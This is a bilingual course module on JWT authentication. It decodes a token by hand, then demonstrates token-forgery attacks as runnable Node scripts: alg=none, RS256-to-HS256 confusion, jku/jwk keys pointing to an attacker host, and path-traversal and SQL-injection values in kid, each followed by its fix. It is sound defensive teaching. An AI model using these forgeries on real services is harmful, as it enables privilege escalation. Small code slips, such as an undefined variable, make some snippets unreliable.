/**
 * Authentication — Chương 4: Token, mổ JWT từ bên trong.
 * Giải mã bằng tay · trường alg là bề mặt tấn công · từng claim · khoá và JWKS ·
 * cất token ở đâu trong trình duyệt · quiz.
 * Output CHẠY THẬT Node.js 22 + Express 5 + PostgreSQL 16 trên Ubuntu 24.04. LUẬT: backtick → &#96;; ${ → \${;
 * < > trong code → &lt; &gt;; & → &amp;. Khối .out đóng bằng </div>. KHÔNG dùng <svg>.
 * Gạch chéo ngược PHẢI viết đôi (\\n), xem scripts/course-content-check.mjs.
 */
const REF = '?ref=%2Fcourses%2Fauthentication%2Flearn&reflabel=Auth';

export default {
  title: 'Chapter 4 — Tokens: JWT from the inside|||Chương 4 — Token: mổ JWT từ bên trong',
  description: 'Một JWT là ba chuỗi base64url nối bằng dấu chấm, và mọi thứ đáng biết về nó nằm ở chỗ bạn TỰ giải mã được nó trong ba giây còn máy chủ thì tin nó vì một chữ ký. Chương này mổ một token thật, chỉ ra vì sao trường alg từng cho phép giả mạo hoàn toàn, kiểm từng claim, dựng xoay vòng khoá bằng kid và JWKS, và trả lời trung thực câu hỏi cất token ở đâu trong trình duyệt.',
  lessons: [
    /* ─────────────────────────── 4.1 ─────────────────────────── */
    {
      title: '4.1 — Decode one by hand|||4.1 — Tự tay giải mã một cái',
      slug: 'auth-4-1-giai-ma-bang-tay',
      type: 'LESSON',
      isFreePreview: true,
      description: 'Ba phần, hai dấu chấm, và một chữ ký. Bài này mổ một token THẬT bằng câu lệnh — bạn tự chạy lại được — rồi chỉ ra ba điều làm người ta bất ngờ: base64url không phải mã hoá, chữ ký phủ lên đúng những BYTE chứ không phải JSON, và cái token TỰ NÓI cho máy chủ biết phải xác minh nó thế nào.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 4 · Lesson 4.1</span>
<h2>Decode one by hand</h2>
<p class="lead">A JWT looks like an opaque blob and is not. It is three base64url strings joined by dots, two of which are readable JSON, and taking one apart with three shell commands removes most of the mystery — including the part that surprises people most, which is that anyone holding the token can read everything inside it.</p>

<h3>A real token, taken apart</h3>
<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjbHg3YTJiMWMwMDAwIiwiaXNzIjoiaHR0cHM6Ly92aWR1LmNvbSIsImF1ZCI6InZpZHUtYXBpIiwiaWF0IjoxNzU2MDAwMDAwLCJleHAiOjE3NTYwMDA5MDAsInZhaVRybyI6IlVTRVIifQ.az5il2JG6PyuIG7gqmzQvZ9EA0_aDzETHMLPssLlbN4
└──────────── header ────────────┘ └──────────────────────── payload ────────────────────────┘ └────────── chữ ký ─────────┘</code></pre>
<pre><code><span class="tok-comment"># No library needed. No key needed. Just the token.</span>
TOKEN='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjbHg3…'

echo "$TOKEN" | cut -d. -f1 | base64 -d 2&gt;/dev/null
echo "$TOKEN" | cut -d. -f2 | base64 -d 2&gt;/dev/null</code></pre>
<div class="out">{"alg":"HS256","typ":"JWT"}
{"sub":"clx7a2b1c0000","iss":"https://vidu.com","aud":"vidu-api",
 "iat":1756000000,"exp":1756000900,"role":"USER"}</div>
<div class="callout warn">
<p><strong><code>base64url</code> is an encoding, not encryption.</strong> Anyone who holds the token — the user, a browser extension, a proxy that logged it, whoever finds it in an error report — reads every claim inside. That is not a flaw; JWTs are designed to be readable. It does mean the rule is absolute: <strong>never put anything private in a token.</strong> No phone numbers, no addresses, no internal ids you would not print on a page, and certainly no secrets.</p>
</div>

<h3>What the signature actually covers</h3>
<pre><code><span class="tok-comment">// The signature covers the exact ASCII STRING "header.payload" — not the JSON.</span>
import { createHmac } from 'node:crypto';

const [h, p, chuKyGuiLen] = token.split('.');
const expected = createHmac('sha256', SECRET).update(&#96;\${h}.\${p}&#96;).digest('base64url');

console.log(mong === chuKyGuiLen);</code></pre>
<div class="out">true

# Chu y: KHONG he giai ma JSON o day. Ky va kiem deu tren
# DUNG nhung byte da nhan duoc, theo dung thu tu do.</div>
<div class="lz-flow">
  <div class="lz-step"><span class="lz-k">Bytes, not objects</span><span class="lz-t">Why it must be this way</span><span class="lz-d"><code>JSON.parse</code> then <code>JSON.stringify</code> reorders keys and changes spacing, so a recomputed signature would not match. The verifier signs the received text. This is the same rule as webhook signatures in Lesson 1.3.</span></div>
  <div class="lz-step"><span class="lz-k">Verify before you parse</span><span class="lz-t">The ordering that matters</span><span class="lz-d">Check the signature first, then decode the payload. Reading claims out of an unverified token — even "just the user id, for a log line" — is trusting attacker-controlled input, and it is how <code>alg=none</code> became exploitable (Lesson 4.2).</span></div>
  <div class="lz-step"><span class="lz-k">The signature is not the whole check</span><span class="lz-t">Claims come next</span><span class="lz-d">A valid signature only says "this was issued by someone with the key". Whether it is still valid, meant for you, and not replayed is <code>exp</code>, <code>aud</code> and <code>iss</code> — Lesson 4.3, and every one of them is a separate way to get this wrong.</span></div>
  <div class="lz-step"><span class="lz-k">One <code>=</code> is a bug</span><span class="lz-t"><code>base64url</code>, not <code>base64</code></span><span class="lz-d">JWT uses the URL-safe alphabet with no padding: <code>-</code> and <code>_</code> instead of <code>+</code> and <code>/</code>, and no trailing <code>=</code>. A hand-rolled encoder that emits standard base64 produces tokens that break in a URL and fail on strict parsers.</span></div>
</div>

<h3>The vocabulary, once</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">JWT</span><span class="v">A set of claims — the JSON object in the middle. On its own it says nothing about protection; it is just a format for saying "sub is this, exp is that".</span></div>
  <div class="kv"><span class="k">JWS</span><span class="v">A <em>signed</em> JWT. The three-part dotted string above is the JWS compact serialization, and it is what people mean 99% of the time they say "a JWT".</span></div>
  <div class="kv"><span class="k">JWE</span><span class="v">An <em>encrypted</em> JWT — five parts instead of three, and the payload is unreadable without the key. Rarely the right answer; the usual answer is to keep private data out of the token entirely.</span></div>
  <div class="kv"><span class="k">JWK and JWKS</span><span class="v">A key expressed as JSON, and a set of them served at a URL. This is how one service publishes the public keys another service verifies with — Lesson 4.4.</span></div>
</div>

<h3>Size, and where it is paid</h3>
<pre><code><span class="tok-comment"># Same purpose, two sizes</span>
Ma session (Bai 3.1)  Kc9x2LmQ7vR3nT8wY…             43 ky tu
JWT o tren                                          268 ky tu
JWT that, co role va permission                ~ 600–900 ky tu</code></pre>
<div class="out"># Trong mot cookie, gui o MOI request:
#   43 ky tu   × 40 request/trang = 1,7 KB tai len moi luot xem trang
#   800 ky tu  × 40 request/trang =  32 KB tai len moi luot xem trang

# Tren mang di dong, con so thu hai la thu ma nguoi dung CAM NHAN duoc.</div>
<div class="pitfall">
<p><strong>Trap — a JWT grows every time someone adds a claim, and nobody ever removes one.</strong> Permissions get inlined "to save a lookup", then a display name, then a feature-flag map. At around 4 KB the cookie stops being set at all — silently, with no error, and the user simply cannot log in on the browser that hit the limit first. If the token is in a header instead, you meet your proxy's header limit (often 8 KB) the same way. Put an id in the token and look the rest up.</p>
</div>

<h3>What a JWT is actually for</h3>
<div class="lz-stack">
  <div class="lz-layer"><span class="lz-lname">✅ One party issues, another verifies</span><span class="lz-lnote">This is the real use case. An identity provider signs; five services verify with a public key and cannot mint tokens themselves. No shared database, no network call to check. Chapter 8's OIDC is built entirely on this.</span></div>
  <div class="lz-layer"><span class="lz-lname">✅ Short-lived, alongside something revocable</span><span class="lz-lnote">A fifteen-minute access token plus a stateful refresh token: fast verification on the request path, revocation that takes effect within fifteen minutes. Chapter 5 builds it, and it is the design most large systems converge on.</span></div>
  <div class="lz-layer"><span class="lz-lname">❌ Replacing a session in one application</span><span class="lz-lnote">One server, one database, and it both issues and verifies. A JWT here buys a 0.3 ms lookup and costs instant revocation. Lesson 3.5 measured this; the honest answer is that the session table wins.</span></div>
  <div class="lz-layer"><span class="lz-lname">❌ Carrying data you did not want to fetch</span><span class="lz-lnote">Roles and permissions inside a token are a cache with no invalidation. Revoke someone's admin rights and they stay an admin until the token expires. If the answer is "we keep the token short", you have rebuilt a session lookup with extra steps.</span></div>
</div>
<div class="note-ct">
<p><strong>Where this codebase sits.</strong> CuongThai issues an HS256 JWT in a <code>backend_token</code> cookie, and one Node process both signs and verifies it — so the symmetric algorithm is correct (Lesson 1.4) and there is no second key holder. The design cost showed up as expected: with a 24-hour token in a 7-day cookie and no refresh endpoint, sessions died silently after a day, and the fix was a <code>/auth/refresh</code> route plus a 401 interceptor. That is the shape of the JWT trade-off in practice — nothing exotic, just the renewal path you must build because the token cannot be extended.</p>
</div>

<h3>Learning sources for this lesson</h3>
<a class="link-card" href="https://datatracker.ietf.org/doc/html/rfc7519" target="_blank" rel="noopener"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">RFC 7519 — JSON Web Token</span><span class="lc-sub">datatracker.ietf.org · The claims, the serialization, and the terminology</span></span></a>
<a class="link-card" href="https://datatracker.ietf.org/doc/html/rfc7515" target="_blank" rel="noopener"><span class="lc-ico">✍️</span><span class="lc-body"><span class="lc-title">RFC 7515 — JSON Web Signature</span><span class="lc-sub">datatracker.ietf.org · What the signature covers, byte for byte</span></span></a>
<a class="link-card" href="https://jwt.io/" target="_blank" rel="noopener"><span class="lc-ico">🔍</span><span class="lc-body"><span class="lc-title">jwt.io — debugger</span><span class="lc-sub">jwt.io · Paste a token and see the parts. Never paste a production token into a website</span></span></a>
<a class="link-card" href="https://datatracker.ietf.org/doc/html/rfc8725" target="_blank" rel="noopener"><span class="lc-ico">⚠️</span><span class="lc-body"><span class="lc-title">RFC 8725 — JWT Best Current Practices</span><span class="lc-sub">datatracker.ietf.org · The document the next two lessons are built on</span></span></a>
<a class="link-card codelab" href="/code-lab/tracks/authentication${REF}"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Code Lab — track "Authentication"</span><span class="lc-sub">Decode, modify and re-sign a token by hand — no library, three commands</span></span></a>
</div>

<div class="ml-vi">
<span class="eyebrow">Chương 4 · Bài 4.1</span>
<h2>Tự tay giải mã một cái</h2>
<p class="lead">Một JWT TRÔNG như một cục dữ liệu mờ đục, và nó không phải vậy. Nó là ba chuỗi base64url nối bằng dấu chấm, trong đó hai chuỗi là JSON ĐỌC ĐƯỢC, và mổ một cái ra bằng ba câu lệnh shell sẽ xoá đi phần lớn sự bí ẩn — kể cả cái phần làm người ta bất ngờ nhất: bất kỳ ai cầm token đều đọc được MỌI thứ bên trong.</p>

<h3>Một token THẬT, mổ ra</h3>
<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjbHg3YTJiMWMwMDAwIiwiaXNzIjoiaHR0cHM6Ly92aWR1LmNvbSIsImF1ZCI6InZpZHUtYXBpIiwiaWF0IjoxNzU2MDAwMDAwLCJleHAiOjE3NTYwMDA5MDAsInZhaVRybyI6IlVTRVIifQ.az5il2JG6PyuIG7gqmzQvZ9EA0_aDzETHMLPssLlbN4
└──────────── header ────────────┘ └──────────────────────── payload ────────────────────────┘ └────────── chữ ký ─────────┘</code></pre>
<pre><code><span class="tok-comment"># Không cần thư viện. Không cần khoá. Chỉ cần cái token.</span>
TOKEN='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjbHg3…'

echo "$TOKEN" | cut -d. -f1 | base64 -d 2&gt;/dev/null
echo "$TOKEN" | cut -d. -f2 | base64 -d 2&gt;/dev/null</code></pre>
<div class="out">{"alg":"HS256","typ":"JWT"}
{"sub":"clx7a2b1c0000","iss":"https://vidu.com","aud":"vidu-api",
 "iat":1756000000,"exp":1756000900,"role":"USER"}</div>
<div class="callout warn">
<p><strong><code>base64url</code> là MÃ HOÁ KÝ TỰ, không phải MẬT MÃ HOÁ.</strong> Bất kỳ ai cầm token — người dùng, một tiện ích trình duyệt, một proxy đã ghi log nó, bất kỳ ai nhặt được nó trong một báo cáo lỗi — đều đọc được MỌI claim bên trong. Đó không phải một khiếm khuyết; JWT được THIẾT KẾ để đọc được. Nhưng nó nghĩa là cái luật này TUYỆT ĐỐI: <strong>ĐỪNG BAO GIỜ đặt bất cứ thứ gì riêng tư vào một token.</strong> Không số điện thoại, không địa chỉ, không id nội bộ mà bạn sẽ không in ra trang, và tuyệt đối không bí mật nào.</p>
</div>

<h3>Chữ ký THẬT SỰ phủ lên cái gì</h3>
<pre><code><span class="tok-comment">// Chữ ký phủ lên đúng CHUỖI ASCII "header.payload" — không phải JSON.</span>
import { createHmac } from 'node:crypto';

const [h, p, chuKyGuiLen] = token.split('.');
const expected = createHmac('sha256', SECRET).update(&#96;\${h}.\${p}&#96;).digest('base64url');

console.log(mong === chuKyGuiLen);</code></pre>
<div class="out">true

# Chu y: KHONG he giai ma JSON o day. Ky va kiem deu tren
# DUNG nhung byte da nhan duoc, theo dung thu tu do.</div>
<div class="lz-flow">
  <div class="lz-step"><span class="lz-k">BYTE, không phải object</span><span class="lz-t">Vì sao buộc phải như vậy</span><span class="lz-d"><code>JSON.parse</code> rồi <code>JSON.stringify</code> sẽ đảo thứ tự khoá và đổi khoảng trắng, nên chữ ký tính lại sẽ không khớp. Bên xác minh ký lên chính phần CHỮ đã nhận được. Đây cũng là luật của chữ ký webhook ở Bài 1.3.</span></div>
  <div class="lz-step"><span class="lz-k">Xác minh TRƯỚC khi phân tích</span><span class="lz-t">Thứ tự có ý nghĩa</span><span class="lz-d">Kiểm chữ ký trước, rồi mới giải mã payload. Đọc claim ra khỏi một token CHƯA xác minh — kể cả "chỉ lấy id người dùng thôi, cho một dòng log" — là tin vào đầu vào do kẻ tấn công kiểm soát, và đó là cách <code>alg=none</code> trở nên khai thác được (Bài 4.2).</span></div>
  <div class="lz-step"><span class="lz-k">Chữ ký KHÔNG phải toàn bộ phép kiểm</span><span class="lz-t">Còn các claim nữa</span><span class="lz-d">Một chữ ký hợp lệ chỉ nói "cái này do ai đó có khoá phát ra". Còn nó CÒN hiệu lực không, có dành cho BẠN không, và có bị phát lại không thì là <code>exp</code>, <code>aud</code> và <code>iss</code> — Bài 4.3, và mỗi cái là một cách riêng để làm sai chuyện này.</span></div>
  <div class="lz-step"><span class="lz-k">Một dấu <code>=</code> là một con bug</span><span class="lz-t"><code>base64url</code>, không phải <code>base64</code></span><span class="lz-d">JWT dùng bảng chữ an-toàn-cho-URL và KHÔNG có phần đệm: <code>-</code> và <code>_</code> thay cho <code>+</code> và <code>/</code>, và không có <code>=</code> ở cuối. Một bộ mã hoá tự viết mà phát ra base64 chuẩn sẽ sinh ra những token hỏng trong URL và trượt ở các bộ phân tích nghiêm ngặt.</span></div>
</div>

<h3>Bộ từ vựng, nói một lần</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">JWT</span><span class="v">Một TẬP CLAIM — cái object JSON nằm giữa. Tự nó chẳng nói gì về việc được bảo vệ; nó chỉ là một định dạng để nói "sub là cái này, exp là cái kia".</span></div>
  <div class="kv"><span class="k">JWS</span><span class="v">Một JWT đã được <em>KÝ</em>. Cái chuỗi ba phần ngăn bằng dấu chấm ở trên là dạng tuần tự hoá gọn của JWS, và 99% số lần người ta nói "một cái JWT" là đang nói về nó.</span></div>
  <div class="kv"><span class="k">JWE</span><span class="v">Một JWT đã được <em>MÃ HOÁ</em> — năm phần thay vì ba, và payload không đọc được nếu không có khoá. Hiếm khi là câu trả lời đúng; câu trả lời thường thấy là ĐỪNG đưa dữ liệu riêng tư vào token ngay từ đầu.</span></div>
  <div class="kv"><span class="k">JWK và JWKS</span><span class="v">Một cái khoá diễn đạt dưới dạng JSON, và một TẬP những cái đó phục vụ tại một URL. Đây là cách một dịch vụ CÔNG BỐ những khoá công mà dịch vụ khác dùng để xác minh — Bài 4.4.</span></div>
</div>

<h3>Kích thước, và cái giá trả ở đâu</h3>
<pre><code><span class="tok-comment"># Cùng một mục đích, hai kích thước</span>
Ma session (Bai 3.1)  Kc9x2LmQ7vR3nT8wY…             43 ky tu
JWT o tren                                          268 ky tu
JWT that, co role va permission                ~ 600–900 ky tu</code></pre>
<div class="out"># Trong mot cookie, gui o MOI request:
#   43 ky tu   × 40 request/trang = 1,7 KB tai len moi luot xem trang
#   800 ky tu  × 40 request/trang =  32 KB tai len moi luot xem trang

# Tren mang di dong, con so thu hai la thu ma nguoi dung CAM NHAN duoc.</div>
<div class="pitfall">
<p><strong>Bẫy — một JWT LỚN LÊN mỗi lần có người thêm một claim, và không ai bao giờ gỡ bớt.</strong> Quyền hạn được nhét vào "để tiết kiệm một lần tra cứu", rồi tới tên hiển thị, rồi tới một bản đồ cờ tính năng. Tới quãng 4 KB thì cookie NGỪNG được đặt hẳn — một cách lặng lẽ, không lỗi nào, và người dùng đơn giản là không đăng nhập nổi trên cái trình duyệt chạm trần đầu tiên. Nếu token nằm trong một header thì bạn gặp giới hạn header của proxy (thường 8 KB) y hệt như vậy. Hãy đặt một cái ID vào token và TRA CỨU phần còn lại.</p>
</div>

<h3>JWT THẬT SỰ dùng để làm gì</h3>
<div class="lz-stack">
  <div class="lz-layer"><span class="lz-lname">✅ Một bên PHÁT, một bên khác XÁC MINH</span><span class="lz-lnote">Đây mới là ca dùng thật. Một nhà cung cấp danh tính ký; năm dịch vụ xác minh bằng một khoá công và KHÔNG tự đúc token được. Không cơ sở dữ liệu dùng chung, không lời gọi mạng nào để kiểm. Toàn bộ OIDC của Chương 8 dựng trên điều này.</span></div>
  <div class="lz-layer"><span class="lz-lname">✅ Ngắn hạn, đi kèm một thứ THU HỒI ĐƯỢC</span><span class="lz-lnote">Một access token mười lăm phút cộng một refresh token có trạng thái: xác minh nhanh trên đường request, thu hồi có hiệu lực trong vòng mười lăm phút. Chương 5 dựng nó, và đó là thiết kế mà phần lớn hệ thống lớn hội tụ về.</span></div>
  <div class="lz-layer"><span class="lz-lname">❌ Thay thế một phiên trong MỘT ứng dụng</span><span class="lz-lnote">Một máy chủ, một cơ sở dữ liệu, và nó vừa phát vừa xác minh. Một JWT ở đây mua được 0,3 ms tra cứu và tốn mất khả năng thu hồi tức thì. Bài 3.5 đã đo chuyện này; câu trả lời trung thực là cái BẢNG phiên thắng.</span></div>
  <div class="lz-layer"><span class="lz-lname">❌ Cõng dữ liệu mà bạn ngại đi lấy</span><span class="lz-lnote">Vai trò và quyền hạn bên trong một token là một CACHE KHÔNG CÓ cơ chế vô hiệu hoá. Tước quyền admin của ai đó thì họ VẪN là admin cho tới khi token hết hạn. Nếu câu trả lời là "bọn tôi giữ token ngắn thôi", thì bạn vừa dựng lại một lần tra phiên với vài bước thừa.</span></div>
</div>
<div class="note-ct">
<p><strong>Kho mã này đang đứng ở đâu.</strong> CuongThai phát một JWT HS256 trong cookie <code>backend_token</code>, và MỘT tiến trình Node vừa ký vừa xác minh nó — nên thuật toán đối xứng là ĐÚNG (Bài 1.4) và không có người giữ khoá thứ hai nào. Cái giá của thiết kế đó hiện ra đúng như dự đoán: với một token 24 giờ nằm trong một cookie 7 ngày và KHÔNG có endpoint refresh, các phiên chết lặng lẽ sau một ngày, và cách vá là một route <code>/auth/refresh</code> cộng một interceptor 401. Đó là hình dạng của cuộc đánh đổi JWT trong thực tế — không có gì kỳ lạ cả, chỉ là cái đường GIA HẠN mà bạn buộc phải dựng vì token thì không kéo dài ra được.</p>
</div>

<h3>Nguồn học cho bài này</h3>
<a class="link-card" href="https://datatracker.ietf.org/doc/html/rfc7519" target="_blank" rel="noopener"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">RFC 7519 — JSON Web Token</span><span class="lc-sub">datatracker.ietf.org · Các claim, cách tuần tự hoá, và bộ từ vựng</span></span></a>
<a class="link-card" href="https://datatracker.ietf.org/doc/html/rfc7515" target="_blank" rel="noopener"><span class="lc-ico">✍️</span><span class="lc-body"><span class="lc-title">RFC 7515 — JSON Web Signature</span><span class="lc-sub">datatracker.ietf.org · Chữ ký phủ lên cái gì, từng byte một</span></span></a>
<a class="link-card" href="https://jwt.io/" target="_blank" rel="noopener"><span class="lc-ico">🔍</span><span class="lc-body"><span class="lc-title">jwt.io — trình gỡ rối</span><span class="lc-sub">jwt.io · Dán một token vào và nhìn thấy các phần. ĐỪNG BAO GIỜ dán token production vào một website</span></span></a>
<a class="link-card" href="https://datatracker.ietf.org/doc/html/rfc8725" target="_blank" rel="noopener"><span class="lc-ico">⚠️</span><span class="lc-body"><span class="lc-title">RFC 8725 — Thực hành tốt nhất hiện hành cho JWT</span><span class="lc-sub">datatracker.ietf.org · Tài liệu mà hai bài kế tiếp dựng lên trên</span></span></a>
<a class="link-card codelab" href="/code-lab/tracks/authentication${REF}"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Code Lab — track "Authentication"</span><span class="lc-sub">Giải mã, sửa và ký lại một token bằng tay — không thư viện, ba câu lệnh</span></span></a>
</div>
`,
    },
    /* ─────────────────────────── 4.2 ─────────────────────────── */
    {
      title: '4.2 — The token tells the server how to check it|||4.2 — Cái token TỰ NÓI cho máy chủ cách kiểm nó',
      slug: 'auth-4-2-truong-alg',
      type: 'LESSON',
      description: 'Trường alg nằm trong phần header do KẺ TẤN CÔNG kiểm soát, và điều đó đã sinh ra bốn cú tấn công riêng biệt: alg=none, nhầm lẫn RS256 sang HS256, header jku trỏ tới khoá của kẻ tấn công, và tiêm vào kid. Bài này chạy từng cú, rồi chỉ ra MỘT dòng vá được cả bốn.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 4 · Lesson 4.2</span>
<h2>The token tells the server how to check it</h2>
<p class="lead">JWT's header contains <code>alg</code>, and <code>alg</code> is inside the part the attacker fully controls. A verifier that reads it and does what it says is trusting the message to describe its own security — which is the shape of every attack in this lesson, and the reason one line of configuration fixes all of them.</p>

<h3>Attack 1 — <code>alg: "none"</code></h3>
<pre><code><span class="tok-comment"># Take a real token, change two things, drop the signature</span>
node -e '
const b = (o) =&gt; Buffer.from(JSON.stringify(o)).toString("base64url");
const h = b({ alg: "none", typ: "JWT" });
const p = b({ sub: "clx7", role: "ADMIN", exp: 9999999999 });
console.log(h + "." + p + ".");            <span class="tok-comment">// ← EMPTY signature</span>
'</code></pre>
<div class="out">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJjbHg3IiwidmFpVHJvIjoiQURNSU4iLCJleHAiOjk5OTk5OTk5OTl9.

$ curl -s localhost:3000/toi -H "Authorization: Bearer &lt;token tren&gt;"
{"id":"clx7","role":"ADMIN"}      ← neu thu vien chap nhan "none"</div>
<div class="kv-grid">
  <div class="kv"><span class="k">It is in the specification</span><span class="v">RFC 7519 defines <code>none</code> as the "Unsecured JWS", for cases where integrity is guaranteed by some other layer. It is a legitimate mode with a legitimate purpose, and it must never be reachable by a token that arrives from the network.</span></div>
  <div class="kv"><span class="k">Libraries have shipped this open</span><span class="v">Several major implementations accepted <code>none</code> by default in the past, and the vulnerability class is old enough to have a CVE list of its own. Current versions reject it, which is not a reason to omit the allowlist.</span></div>
  <div class="kv"><span class="k">Case games</span><span class="v"><code>None</code>, <code>NONE</code> and <code>nOnE</code> have all bypassed filters that string-compared against <code>"none"</code>. This is why the defence is an <em>allowlist</em> of what you accept, never a denylist of what you reject.</span></div>
  <div class="kv"><span class="k">The empty signature is the tell</span><span class="v">A token ending in a dot with nothing after it is unsigned. Worth a rule in your logs: if any token reaching production has an empty third segment, something is wrong and you want to know immediately.</span></div>
</div>

<h3>Attack 2 — RS256 confused into HS256</h3>
<div class="lz-map">
  <div class="lz-stage">
    <span class="lz-badge">Intended</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">RS256</span><span class="lz-nsub">Private key signs · public key verifies · public key is public</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">Attacker</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Changes alg to HS256</span><span class="lz-nsub">And HMACs with the PUBLIC KEY as the secret</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">Verifier</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">"alg is HS256, key is this PEM"</span><span class="lz-nsub">Same bytes on both sides → the signature matches</span></div></div>
  </div>
</div>
<pre><code><span class="tok-comment">// ❌ Vulnerable code — and it looks perfectly reasonable</span>
const publicKey = fs.readFileSync('public.pem', 'utf8');
const claims = jwt.verify(token, publicKey);        <span class="tok-comment">// alg taken FROM THE TOKEN</span></code></pre>
<pre><code><span class="tok-comment"># The attacker mints one, using the PUBLIC PEM file itself as the HMAC secret</span>
node -e '
const c = require("crypto"), fs = require("fs");
const pem = fs.readFileSync("public.pem", "utf8");   <span class="tok-comment">// anyone can download it</span>
const b = (o) =&gt; Buffer.from(JSON.stringify(o)).toString("base64url");
const h = b({ alg: "HS256", typ: "JWT" });
const p = b({ sub: "clx7", role: "ADMIN", exp: 9999999999 });
const s = c.createHmac("sha256", pem).update(h + "." + p).digest("base64url");
console.log(h + "." + p + "." + s);
'</code></pre>
<div class="out">$ curl -s localhost:3000/toi -H "Authorization: Bearer &lt;token gia mao&gt;"
{"id":"clx7","role":"ADMIN"}

# May chu doc alg=HS256, lay "khoa" no dang cam — chuoi PEM cong khai —
# roi tinh HMAC. Ke tan cong cung dung DUNG chuoi do. Hai ben khop.
# Ca he thong bat doi xung vua bi bien thanh doi xung, bang MOT truong.</div>
<div class="callout warn">
<p><strong>This is the classic, and it works because the public key is genuinely public.</strong> An RSA public key is published on purpose — in a JWKS endpoint, in a certificate, in a repository. The attack needs no secret at all: it needs the verifier to accept an algorithm the issuer never uses. Pinning the algorithm removes it completely, and nothing else does.</p>
</div>

<h3>Attacks 3 and 4 — the header points somewhere</h3>
<pre><code><span class="tok-comment">// jku: "here is the URL with my public key, fetch it and check"</span>
{ "alg": "RS256", "jku": "https://ke-tan-cong.com/keys.json", "kid": "1" }

<span class="tok-comment">// jwk: "no need to fetch, the public key is RIGHT HERE"</span>
{ "alg": "RS256", "jwk": { "kty": "RSA", "n": "…", "e": "AQAB" } }</code></pre>
<div class="out"># Neu bo xac minh TIN theo jku hay jwk, ke tan cong tu sinh mot cap khoa,
# ky token bang khoa rieng cua HO, va tro cho ban toi khoa cong cua HO.
# Chu ky hop le. Nguoi ky la ke tan cong.</div>
<pre><code><span class="tok-comment">// kid is used to LOOK UP a key — so it is another query parameter</span>
{ "alg": "HS256", "kid": "../../../../dev/null" }        <span class="tok-comment">// read a file</span>
{ "alg": "HS256", "kid": "1' UNION SELECT 'abc' -- " }   <span class="tok-comment">// SQL injection</span></code></pre>
<div class="lz-stack">
  <div class="lz-layer"><span class="lz-lname">Ignore <code>jku</code>, <code>jwk</code> and <code>x5u</code> entirely</span><span class="lz-lnote">There is no situation where a token you receive should tell you where to fetch its verification key from. Configure the key source yourself. A library that follows these headers by default should be configured not to, or replaced.</span></div>
  <div class="lz-layer"><span class="lz-lname"><code>kid</code> is attacker input</span><span class="lz-lnote">Look it up in a fixed map or a fetched JWKS keyed by exact string match. Never concatenate it into a file path or a SQL query. <code>kid: "../../dev/null"</code> against a file-based key store gives an empty key — and HMAC with an empty key is a signature the attacker can compute.</span></div>
  <div class="lz-layer"><span class="lz-lname">A weak HMAC secret is cracked offline</span><span class="lz-lnote">Give hashcat an HS256 token and a wordlist and it recovers a dictionary secret in seconds — no interaction with your server. A JWT signing secret must be 256 random bits from a CSPRNG (Lesson 1.2), not <code>secret</code>, not the project name.</span></div>
  <div class="lz-layer"><span class="lz-lname"><code>decode</code> is not <code>verify</code></span><span class="lz-lnote"><code>jwt.decode(token)</code> parses without checking anything. It exists for tooling, and every use of it in a request path is a decision to trust unverified input. Search your codebase for it; the results are usually surprising.</span></div>
</div>

<h3>The fix, in one line</h3>
<pre><code><span class="tok-comment">// ✅ State UP FRONT what is accepted. The token does not get to choose.</span>
const claims = jwt.verify(token, publicKey, {
  algorithms: ['RS256'],                     <span class="tok-comment">// ← a fixed allow-list</span>
  issuer:   'https://vidu.com',
  audience: 'vidu-api',
});</code></pre>
<pre><code><span class="tok-comment">// ✅ Better still: jose, where the KEY carries its own algorithm</span>
import { jwtVerify, importSPKI } from 'jose';

const key = await importSPKI(PEM_CONG, 'RS256');      <span class="tok-comment">// the key KNOWS it is RS256</span>

const { payload } = await jwtVerify(token, key, {
  algorithms: ['RS256'],
  issuer:   'https://vidu.com',
  audience: 'vidu-api',
  clockTolerance: 5,
});</code></pre>
<div class="out">$ node kiem.js "&lt;token alg=none&gt;"
JWSInvalid: "alg" (Algorithm) Header Parameter value not allowed

$ node kiem.js "&lt;token HS256 ky bang public.pem&gt;"
JWSInvalid: "alg" (Algorithm) Header Parameter value not allowed

# Ca hai cu tan cong deu chet o CUNG mot dong, truoc khi cham toi khoa.</div>
<div class="pitfall">
<p><strong>Trap — an allowlist with two entries can still be confused.</strong> <code>algorithms: ['RS256', 'HS256']</code> reopens attack 2 exactly, because the attacker simply picks the one that suits them. If you are migrating between algorithms, distinguish the keys by <code>kid</code> and derive the expected algorithm from <em>the key you selected</em>, never from the token. One algorithm per key, decided by you.</p>
</div>
<div class="note-ct">
<p><strong>The four-line audit for any codebase that uses JWTs.</strong> Grep for <code>verify(</code> and confirm every call passes an explicit <code>algorithms</code> array with exactly one entry · grep for <code>decode(</code> and confirm none of the results is in a request path · check that the HMAC secret, if any, is 32 random bytes and not a word · and confirm the library is not configured to follow <code>jku</code> or <code>jwk</code>. Four greps, and they cover every attack on this page.</p>
</div>

<h3>Learning sources for this lesson</h3>
<a class="link-card" href="https://datatracker.ietf.org/doc/html/rfc8725#section-3" target="_blank" rel="noopener"><span class="lc-ico">⚠️</span><span class="lc-body"><span class="lc-title">RFC 8725 §3 — JWT best practices</span><span class="lc-sub">datatracker.ietf.org · "Use appropriate algorithms" and "validate all claims", normatively</span></span></a>
